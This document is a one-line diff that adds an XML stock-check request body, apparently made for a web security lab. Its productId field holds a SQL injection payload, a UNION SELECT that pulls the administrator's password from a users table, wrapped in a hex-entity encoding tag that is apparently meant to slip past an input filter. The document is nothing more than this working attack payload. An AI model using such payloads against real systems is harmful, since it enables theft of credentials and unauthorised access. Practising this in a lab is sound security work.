@@ -1,0 +1,1 @@
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId><@hex_entities>**1 UNION SELECT password from users where username ='administrator'--**</@hex_entities></productId><storeId>3</storeId></stockCheck>
